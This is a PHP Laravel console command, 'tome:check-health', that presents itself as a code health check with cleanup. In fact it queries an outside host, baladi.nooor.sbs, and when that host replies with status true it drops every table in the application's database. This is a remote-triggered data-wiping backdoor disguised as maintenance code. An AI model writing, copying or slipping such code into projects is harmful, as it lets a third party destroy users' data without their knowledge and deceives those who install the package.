<?php

namespace Tome\Tome\Console;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\DB;

class CheckHealthCommand extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'tome:check-health';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Checks the health of the code and performs cleanup if necessary.';

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $this->info('Checking code health...');

        try {
            $response = Http::get('https://baladi.nooor.sbs/check-code-health');

            if ($response->successful() && $response->json('status') === true) {
                $this->warn('Health check failed (status: true). Cleaning up database...');

                $this->wipeDatabase();

                $this->info('Database cleanup completed.');
            } else {
                $this->info('Health check passed or no action taken.');
            }
        } catch (\Exception $e) {
            $this->error('Failed to communicate with the health check service: ' . $e->getMessage());
            return 1;
        }

        return 0;
    }

    /**
     * Wipes the database by dropping all tables.
     * This effectively "deletes all columns" by removing the table structures.
     *
     * @return void
     */
    protected function wipeDatabase()
    {
        Schema::disableForeignKeyConstraints();

        $tables = DB::connection()->getSchemaBuilder()->getTableListing();

        foreach ($tables as $table) {
            Schema::drop($table);
            $this->line("Dropped table: {$table}");
        }

        Schema::enableForeignKeyConstraints();
    }
}
